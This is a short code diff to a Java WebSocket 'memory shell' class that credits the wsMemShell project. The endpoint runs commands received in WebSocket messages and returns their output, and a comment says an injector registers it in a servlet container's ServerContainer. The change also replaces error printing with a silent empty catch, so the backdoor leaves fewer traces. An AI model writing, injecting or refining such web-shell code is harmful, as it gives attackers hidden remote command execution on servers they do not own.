@@ -8,6 +8,8 @@ import java.io.InputStream;
 import java.util.Scanner;
 
 /**
+ * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
+ *
  * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
  *
  * @author ReaJason
@@ -21,9 +23,9 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
     public void onMessage(String cmd) {
         try {
             InputStream inputStream = getInputStream(getParam(cmd));
-            session.getBasicRemote().sendText(new Scanner(inputStream).useDelimiter("\\A").next());
-        } catch (Throwable e) {
-            e.printStackTrace();
+            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
+            session.getBasicRemote().sendText(scanner.hasNext() ? scanner.next() : "");
+        } catch (Throwable ignored) {
         }
     }
 
